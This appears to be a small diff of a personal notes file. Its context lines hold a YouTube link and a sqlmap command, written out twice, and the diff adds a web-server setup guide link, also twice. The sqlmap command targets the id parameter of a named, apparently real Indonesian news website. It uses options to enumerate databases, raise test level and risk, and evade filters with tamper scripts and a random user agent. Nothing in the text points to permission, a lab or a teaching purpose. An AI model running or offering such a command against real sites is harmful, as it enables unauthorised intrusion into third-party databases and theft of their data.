@@ -14,3 +14,6 @@ https://youtu.be/vI4xQviNkbQ?si=QBisRsl4A3VK3Cn1
 
 sqlmap -u "https://penaaspirasirakyatindonesia.com/berita_detail.php?id=186" --dbs --flush-session --level=3 --risk=3 --no-cast --tamper="space2comment, between" --dbms=mysql --tech=T --random-agent --batch
 sqlmap -u "https://penaaspirasirakyatindonesia.com/berita_detail.php?id=186" --dbs --flush-session --level=3 --risk=3 --no-cast --tamper="space2comment, between" --dbms=mysql --tech=T --random-agent --batch
+
+https://idcloudhost.com/panduan/cara-membangun-web-server-di-ubuntu/
+https://idcloudhost.com/panduan/cara-membangun-web-server-di-ubuntu/
